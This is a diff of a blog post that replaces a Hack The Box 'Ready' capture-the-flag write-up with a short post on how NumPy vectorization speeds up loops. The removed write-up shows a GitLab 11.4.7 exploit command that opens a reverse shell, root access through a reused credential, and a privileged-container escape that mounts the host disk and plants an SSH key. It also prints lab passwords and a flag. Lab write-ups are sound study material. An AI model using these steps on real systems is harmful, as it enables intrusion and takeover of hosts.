@@ -1,147 +1,79 @@
 ---
 layout: single
-title: Ready - Hack The Box
-excerpt: "Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory."
-date: 2021-05-15
+title: NumPy is absolute magic
+excerpt: "NumPy is a python library uncommonly used for data analysis since other libraries built on top of it, like Pandas, are more useful, however their speed are thanks to NumPy inner looping optimization. This is achieved by Vectorization and Broadcasting. However, why does it really works in a computer?"
+date: 2022-07-06
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-ready/ready_logo.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
-  - hackthebox
-  - infosec
+  - NumPy
+  - Data Analysis
 tags:
-  - linux
-  - gitlab
-  - cve
-  - docker
-  - privileged container
+  - python
+  - libraries
+  - tools
+  - numpy
+  - vectorization
+  - looping
 ---
 
 ![](/assets/images/htb-writeup-ready/ready_logo.png)
 
-Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.
+## NumPy is absolute magic.
 
-## Portscan
+For my first blog entry, I'd like to talk about NumPy, a python library used for mathematical operations.
 
-```
-sudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDT
-Nmap scan report for 10.129.149.31
-Host is up (0.015s latency).
-Not shown: 65533 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
-5080/tcp open  http    nginx
-| http-robots.txt: 53 disallowed entries (15 shown)
-| / /autocomplete/users /search /api /admin /profile 
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
-|_/s/ /snippets/new /snippets/*/edit
-| http-title: Sign in \xC2\xB7 GitLab
-|_Requested resource was http://10.129.149.31:5080/users/sign_in
-|_http-trane-info: Problem with XML parsing of /evox/about
-```
+Personally, all this sounds like alien stuff to me, so I wanted to know more about the "*python is slow, numpy makes it faster*" thing I've heard a lot while starting my data analysis studies.
 
-## Gitlab
+This is what I found after some research.
 
-The webserver on port 5080 runs a Gitlab instance.
+The way a program operates stuff with data, specially data arrays, is having loops for calculations. *Making it easier, making it *faster is what designers try to achieve.
+NumPy works with 2 concepts: **Vectorization** and **Broadcasting**.
+The loops are inevitable, but they can be improved for faster calculations and, better mathematical visualization of a code.
 
-![](/assets/images/htb-writeup-ready/gitlab1.png)
+Thats good, it makes sense, but doesn't tell me how exactly this is achieved.
 
-We have access to create a new account.
+If I have a loop, and make it better, it will show the same problems a loop has. Why is necessary to change it?
 
-![](/assets/images/htb-writeup-ready/gitlab2.png)
+Like an oasis in the middle of the desert, ***Beautiful Code***, written by Andy Oram and Greg Wilson, in its chapter 14 gives an explanation.
 
-Once logged in, we see in the projects list there's a single projet called *ready-channel*.
+NumPy works with the idea of arrays, and the code execution is optimized on the loop over a single dimension where simple striding can be assumed.
+In simpler words, Numpy makes two things, return a modified iterator and remove dimensions from an iteration.
+By doing so, the outer loop iterations will be reduced and inner loop iterations will be faster.
 
-![](/assets/images/htb-writeup-ready/gitlab3.png)
+However, the bottleneck here is the time needed to input or output data from memory for all purpose processors. And here comes the magic: NumPy makes sure the inner loop proceeds with data as close as possible. This makes the inner loop optimized for speed. As how does it work in a computer, you can say it works with a form of parallelism, either SIMD or BLAS, auto Vectorization, etc. So it doesn't thread but loop. And those loops are incredibly fast.
 
-To check the Gitlab version we go to the Help section and we can see it's running 11.4.7.
 
-![](/assets/images/htb-writeup-ready/gitlab5.png)
+Now tell me, how is this anything but magic?
 
-A quick search on Exploit-DB shows there's an authenticated remote code execution vulnerability for this exact version.
 
-![](/assets/images/htb-writeup-ready/gitlab6.png)
+This is not in the scope of Data Analysis, but admittedly, now I know that NumPy is a lot more than a "fast thing" I'll use from now on. I got into themes like parallelism, SIMD and api programming just by looking this up. 
 
-`python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444`
 
-Reverse shell connection:
+### References:
+ - Beautiful Code by Andy Oram, Greg Wilson. Chapter 19: "Multidimensional Iterators in Numpy".  O'Reilly Media Inc. 2007. ISBN: 978-0-5965-1005-6
 
-![](/assets/images/htb-writeup-ready/shell.png)
+ - Python Data Analytics by Fabio Nell. Chapter 3:"The Numpy library". Apress Media 2015. ISBN-13 (pbk): 978-1-4842-0959-2 ISBN-13 (electronic): 978-1-4842-0958-5
 
-![](/assets/images/htb-writeup-ready/user.png)
+ - https://numpy.org/doc/stable/reference/arrays.ndarray.html
 
-## Privesc
+ - https://numpy.org/doc/stable/numpy-user.pdf
 
-By running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) we find a backup file with some SMTP credentials for the gitlab application. 
+ - https://morioh.com/p/70493e6bfaed
 
-```
-Found /opt/backup/gitlab.rb
-gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
-```
+ - https://en.wikipedia.org/wiki/Single_instruction,_multiple_data
 
-That password is the same password as the root password for the container so we can privesc locally inside the container.
+ - https://en.wikipedia.org/wiki/Vector_processor
 
-```
-git@gitlab:/opt/backup$ su -l root
-su -l root
-Password: wW59U!ZKMbG9+*#h
+ - https://stackoverflow.com/questions/14259737/what-is-the-relationship-between-vectorization-and-embarrasingly-parallel
 
-root@gitlab:~# 
-```
+ - https://insidebigdata.com/2017/09/20/importance-vectorization-resurfaces/
 
-There's a root_pass file in the root of the filesystem but that's not useful.
+ - https://www.quantifisolutions.com/vectorization-part-2-why-and-what/
 
-```
-cat /root_pass
-YG65407Bjqvv9A0a8Tm_7w
-```
+ - https://www.upgrad.com/blog/vectorization-and-broadcasting-in-python/#:~:text=Vectorization%20and%20Broadcasting%20are%20ways,don't%20face%20any%20bottlenecks.
 
-If we look at the `/opt/backup/docker-compose.yml` configuration file, we can see it's a hint that we're running in a privileged container:
 
-```
-    volumes:
-      - './srv/gitlab/config:/etc/gitlab'
-      - './srv/gitlab/logs:/var/log/gitlab'
-      - './srv/gitlab/data:/var/opt/gitlab'
-      - './root_pass:/root_pass'
-    privileged: true
-    restart: unless-stopped
-    #mem_limit: 1024m
-```
-
-Privileged containers can access the host's disk devices so we can just read the root flag after mounting the drive.
-
-![](/assets/images/htb-writeup-ready/root.png)
-
-To get a proper shell in the host OS we can drop our SSH keys in the root's .ssh directory.
-
-```
-root@gitlab:~# mount /dev/sda2 /mnt
-mount /dev/sda2 /mnt
-root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' > /mnt/root/.ssh/authorized_keys
-
-[...]
-
-$ ssh root@10.129.150.37
-The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.
-ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
-
-[...]
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Thu Feb 11 14:28:18 2021
-root@ready:~# cat root.txt
-b7f98681505cd39066f67147b103c2b3
-```
